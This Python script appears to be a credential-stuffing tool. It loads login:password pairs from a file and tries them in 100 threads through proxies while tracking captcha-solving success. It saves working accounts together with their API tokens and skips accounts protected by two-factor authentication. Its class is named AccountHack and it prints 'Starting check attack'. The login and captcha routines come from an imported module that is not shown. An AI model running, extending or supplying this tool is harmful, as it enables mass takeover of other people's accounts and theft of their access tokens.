import os.path

from tools import *

LOGIN_PASSWORD_SEPARATOR = ':'  # login:password = ':'; login@password = "@" ect.
accounts = r"./config/logins-passwords.txt"  # file with accounts to check
valid_accounts = "./out/valid_h.list.txt"  # where to write valid accounts
invalid_accounts = "./out/invalid_h.list.txt"  # where to write invalid accounts
threads = 100 # count of threads. If you have good internet connection, you can increase it

proxies_fname = "./config/proxies.txt"  # you may leave file empty
Worker.ProxyType = 'http://'  # your proxy type. If u wana use socks - https://stackoverflow.com/questions/12601316/how-to-make-python-requests-work-via-socks-proxy


checked_accounts = set()
if os.path.exists(invalid_accounts):
    with open(invalid_accounts, encoding='utf-8') as file:
        checked_accounts = set(line.replace('\n', '').replace('\r', '') for line in file)
if os.path.exists(valid_accounts):
    with open(valid_accounts, encoding='utf-8') as file:
        for line in file:
            checked_accounts.add(line)
file_ac = open(accounts, encoding='utf-8')
all_accounts = (
        i.replace('\n', '').replace('\r', '').split(LOGIN_PASSWORD_SEPARATOR, 1)
        for i in file_ac
        if i.replace('\n', '').replace('\r', '')
           not in checked_accounts and LOGIN_PASSWORD_SEPARATOR in i
    )##[::-1]
with open(proxies_fname, encoding='utf-8') as file:
    Worker.Proxies = [i.replace('\n', '').replace('\r', '') for i in file]

class AccountHack(Worker):
    SUCCESS_ACCOUNTS = 0
    PASSWORDS_LOCK = Lock()
    WRITE_CHECK_LOCK = Lock()
    def _work(self):
        while 1:
            with Worker.Lock:
                if not self.Working: break
            self.one_hack_step()

    def _next_login_password(self):
        with self.PASSWORDS_LOCK:
            data = next(all_accounts)
            return data
    def _invalid_pswd(self, login, password):
        with self.WRITE_CHECK_LOCK:
            account = f"{login}{LOGIN_PASSWORD_SEPARATOR}{password}"
            with open(invalid_accounts, 'a', encoding="utf-8") as found_pswd_file:
                found_pswd_file.write(account)
                found_pswd_file.write('\n')
            checked_accounts.add(account)
    def _on_pswd_found(self, login, password, api, need_2fa):
        if need_2fa: self._invalid_pswd(login, password)
        else:
            with self.PASSWORDS_LOCK:
                with open(valid_accounts, 'a', encoding='utf-8') as f:
                    f.write(login)
                    f.write(LOGIN_PASSWORD_SEPARATOR)
                    f.write(password)
                    if need_2fa:
                        f.write(f"{LOGIN_PASSWORD_SEPARATOR}2fa")
                    else:
                        f.write(LOGIN_PASSWORD_SEPARATOR)
                        f.write(api.token)
                    f.write('\n')
            with Worker.Lock:
                AccountHack.SUCCESS_ACCOUNTS += 1
def status_thread():
    print(f"Starting check attack for {colorama.Fore.CYAN}{colorama.Fore.RESET} accounts")
    while 1:
        with Worker.Lock:
            if not Worker.Working: break
        time.sleep(5)
        with Worker.Lock:
            print(
                f"Captcha Progress: {colorama.Fore.GREEN}{str(solver.TOTAL_COUNT-solver.FAIL_COUNT).ljust(9, ' ')}{colorama.Fore.RESET} success,",
                f"{colorama.Fore.RED}{str(solver.FAIL_COUNT).ljust(9, ' ')}{colorama.Fore.RESET} fail =",
                colorama.Fore.CYAN +
                f"{1 - solver.FAIL_COUNT / (solver.TOTAL_COUNT or 1):.2%}".ljust(7, ' '), 'correct',
                colorama.Fore.RESET,
                f"{(1 / (solver.argv_solve_time or 1)):,.2f} captcha per second"
            )


threads = [AccountHack(i) for i in range(threads)]

for i in threads:
    i.start()
threading.Thread(target=status_thread).start()
try:
    for i in threads:
        i.join()
finally:
    with Worker.Lock:
        Worker.Working = False
